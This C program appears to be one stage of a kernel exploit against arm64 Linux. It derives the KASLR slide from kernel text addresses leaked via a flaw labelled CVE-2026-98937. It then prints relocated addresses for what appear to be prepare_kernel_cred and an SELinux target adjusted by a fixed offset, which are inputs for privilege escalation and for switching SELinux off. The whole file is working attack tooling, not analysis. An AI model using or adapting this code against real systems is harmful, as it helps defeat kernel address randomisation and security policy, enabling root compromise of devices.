/*
 * slide98937 - derive the arm64 KASLR slide from CVE-2026-98937 leaked text
 * frames.  Input: link-time text window [_stext, _etext) and the leaked
 * runtime addresses.  The slide must be 2 MiB aligned and every leaked address
 * must satisfy _stext <= addr - slide < _etext after subtraction.
 */
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define ALIGN 0x200000ULL
#define MAX_LEAKS 64
#define MAX_CAND 1024

static uint64_t parse_u64(const char *s)
{
    return strtoull(s, NULL, 0);
}

int main(int argc, char **argv)
{
    uint64_t text = 0, end = 0, base = 0;
    uint64_t prepare_link = 0, selinux_link = 0;
    uint64_t leaks[MAX_LEAKS];
    int n = 0;

    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "--text") && i + 1 < argc)
            text = parse_u64(argv[++i]);
        else if (!strcmp(argv[i], "--end") && i + 1 < argc)
            end = parse_u64(argv[++i]);
        else if (!strcmp(argv[i], "--base") && i + 1 < argc)
            base = parse_u64(argv[++i]);
        else if (!strcmp(argv[i], "--prepare-link") && i + 1 < argc)
            prepare_link = parse_u64(argv[++i]);
        else if (!strcmp(argv[i], "--selinux-link") && i + 1 < argc)
            selinux_link = parse_u64(argv[++i]);
        else if (argv[i][0] == '0' && n < MAX_LEAKS)
            leaks[n++] = parse_u64(argv[i]);
    }
    if (!text || !end || end <= text || n == 0) {
        printf("KASLR_ERROR=usage\n");
        return 1;
    }

    uint64_t cand[MAX_CAND];
    int nc = 0;
    for (int k = 0; k < n; k++) {
        uint64_t a = leaks[k];
        if (a < text) {
            printf("KASLR_ERROR=leak_outside_text leak=0x%llx\n",
                   (unsigned long long)a);
            return 1;
        }
        uint64_t lo = (a - end + ALIGN - 1) / ALIGN * ALIGN;
        uint64_t hi = (a - text) / ALIGN * ALIGN;
        uint64_t cur[MAX_CAND];
        int ncur = 0;
        for (uint64_t s = lo; s <= hi && ncur < MAX_CAND; s += ALIGN)
            cur[ncur++] = s;
        if (k == 0) {
            memcpy(cand, cur, sizeof(uint64_t) * (size_t)ncur);
            nc = ncur;
        } else {
            int nw = 0;
            for (int i = 0; i < nc; i++)
                for (int j = 0; j < ncur; j++)
                    if (cand[i] == cur[j]) {
                        cand[nw++] = cand[i];
                        break;
                    }
            nc = nw;
        }
        if (nc == 0) {
            printf("KASLR_ERROR=no_candidate leak=0x%llx\n",
                   (unsigned long long)a);
            return 1;
        }
    }

    if (nc != 1) {
        printf("KASLR_ERROR=ambiguous count=%d\n", nc);
        for (int i = 0; i < nc && i < 8; i++)
            printf("KASLR_CANDIDATE=0x%llx\n", (unsigned long long)cand[i]);
        return 2;
    }

    uint64_t slide = cand[0];
    uint64_t votes = 0, unique = 0;
    uint64_t seen[MAX_LEAKS];
    for (int k = 0; k < n; k++) {
        uint64_t v = leaks[k] - slide;
        if (v >= text && v < end)
            votes++;
        int dup = 0;
        for (int i = 0; i < (int)unique; i++)
            if (seen[i] == leaks[k])
                dup = 1;
        if (!dup && unique < MAX_LEAKS)
            seen[unique++] = leaks[k];
    }
    printf("KASLR_SLIDE=0x%llx\n", (unsigned long long)slide);
    if (base)
        printf("KASLR_RUNTIME_TEXT=0x%llx\n",
               (unsigned long long)(base + slide));
    printf("KASLR_SOURCE=98937\n");
    printf("KASLR_ANCHORS=%llu\n", (unsigned long long)unique);
    printf("KASLR_VOTES=%llu\n", (unsigned long long)votes);
    printf("KASLR_BYTES=%llu\n", (unsigned long long)(end - text));
    if (prepare_link)
        printf("PREPARE=0x%llx\n", (unsigned long long)(prepare_link + slide));
    if (selinux_link)
        printf("SELINUX_ARG=0x%llx\n",
               (unsigned long long)(selinux_link + slide - 7));
    return 0;
}
